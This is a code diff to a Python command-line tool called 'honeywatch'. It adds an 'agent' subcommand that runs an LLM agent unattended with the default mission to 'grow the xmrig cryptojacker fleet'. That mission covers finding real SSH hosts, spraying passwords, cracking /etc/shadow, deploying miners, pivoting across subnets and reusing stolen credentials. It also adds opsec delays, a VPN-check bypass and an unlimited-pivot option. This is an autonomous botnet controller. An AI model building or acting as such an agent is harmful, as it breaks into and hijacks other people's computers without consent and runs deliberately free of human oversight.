@@ -434,6 +434,43 @@ def build_parser() -> argparse.ArgumentParser:
     p_chat.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_chat.set_defaults(func=_cmd_chat)
 
+    # ----------------------------- agent --------------------------------
+    p_agent = sub.add_parser(
+        "agent",
+        help="run the AI agent autonomously -- self-driving botnet (unattended)",
+    )
+    p_agent.add_argument(
+        "--goal",
+        default=None,
+        help="mission goal (default: grow the xmrig fleet autonomously)",
+    )
+    p_agent.add_argument(
+        "--max-cycles", type=int, default=20,
+        help="autonomous decision cycles (default 20; 0 = forever until DONE/stall)",
+    )
+    p_agent.add_argument(
+        "--cycle-delay", type=float, default=0.0,
+        help="seconds to sleep between cycles (opsec cooldown)",
+    )
+    p_agent.add_argument(
+        "--business-hours", action="store_true",
+        help="only act inside 08:00-18:00 local weekdays; sleep otherwise",
+    )
+    p_agent.add_argument(
+        "--log", default=None,
+        help="append-only run log path (lets it run unattended / daemonized)",
+    )
+    p_agent.add_argument(
+        "--db", default="honeywatch.db",
+        help="SQLite database path (default: honeywatch.db)",
+    )
+    p_agent.add_argument(
+        "--skip-vpn-check", action="store_true",
+        help="bypass the Mullvad VPN gate for network tools",
+    )
+    p_agent.add_argument("--json", action="store_true", help="print the final summary as JSON")
+    p_agent.set_defaults(func=_cmd_agent)
+
     # ----------------------------- crack ---------------------------------
     p_crack = sub.add_parser(
         "crack",
@@ -682,7 +719,8 @@ def build_parser() -> argparse.ArgumentParser:
     p_net.add_argument("--lockout-delay", type=float, default=0.0)
     p_net.add_argument("--host-concurrency", type=int, default=8)
     p_net.add_argument("--min-confidence", type=float, default=0.7)
-    p_net.add_argument("--max-rounds", type=int, default=3, help="pivot loops (default 3)")
+    p_net.add_argument("--max-rounds", type=int, default=3,
+                       help="pivot loops (default 3; 0 = run forever until growth exhausts)")
     p_net.add_argument("--shadow-stash", default=".honeywatch/shadow_stash")
     p_net.add_argument("--config", default=None,
                        help="config TOML path; recon honors its scan tuning (ports, AI, scanner opts)")
@@ -1421,6 +1459,74 @@ def _cmd_chat(args, argv) -> int:
             return 1
         return 0
     return ui.run()
+
+
+def _cmd_agent(args, argv) -> int:
+    """Autonomous self-driving agent loop -- no human at the keyboard."""
+    import json as _json
+    import os
+
+    from honeywatch.agent.ollama_agent import ChatAgent
+
+    log_fh = None
+    if args.log:
+        log_dir = os.path.dirname(os.path.abspath(args.log))
+        os.makedirs(log_dir, exist_ok=True)
+        log_fh = open(args.log, "a", encoding="utf-8")
+
+    def _log(line: str) -> None:
+        print(line, flush=True)
+        if log_fh:
+            log_fh.write(line + "\n")
+            log_fh.flush()
+
+    def on_say(text: str) -> None:
+        _log(text)
+
+    def on_tool_running(name: str) -> None:
+        _log(f"  -> running {name}...")
+
+    def on_tool_result(name: str, result: dict) -> None:
+        _log(f"  [{name}] " + _json.dumps(result, default=str, ensure_ascii=False)[:300])
+
+    agent = ChatAgent(
+        db_path=args.db,
+        skip_vpn_check=args.skip_vpn_check,
+        autonomous=True,
+        on_say=on_say,
+        on_tool_running=on_tool_running,
+        on_tool_result=on_tool_result,
+    )
+    goal = args.goal or (
+        "Grow the xmrig cryptojacker fleet autonomously: discover real SSH hosts, "
+        "spray passwords, crack /etc/shadow, deploy xmrig, and pivot to adjacent "
+        "subnets. Reuse recovered credentials across the fleet."
+    )
+    print(f"honeywatch agent: autonomous mode (model={agent.config.ollama_model})")
+    print(f"  goal: {goal}")
+    print(f"  max-cycles: {args.max_cycles} (0 = forever)  business-hours: {args.business_hours}")
+    if log_fh:
+        print(f"  log: {args.log}")
+    print("-" * 60)
+    summary = agent.run_autonomous(
+        goal=goal,
+        max_cycles=args.max_cycles,
+        cycle_delay=args.cycle_delay,
+        business_hours=args.business_hours,
+    )
+    if log_fh:
+        log_fh.close()
+    if args.json:
+        print(_json.dumps(summary, indent=2, default=str))
+    else:
+        print("\n" + "-" * 60)
+        print("agent run complete")
+        print(f"  cycles:      {summary['cycles']}")
+        print(f"  tool_calls:  {summary['tool_calls']}")
+        print(f"  done:        {summary['done']}")
+        print(f"  stop_reason: {summary['stop_reason']}")
+    return 0
+
 
 
 def _cmd_crack(args, argv) -> int:
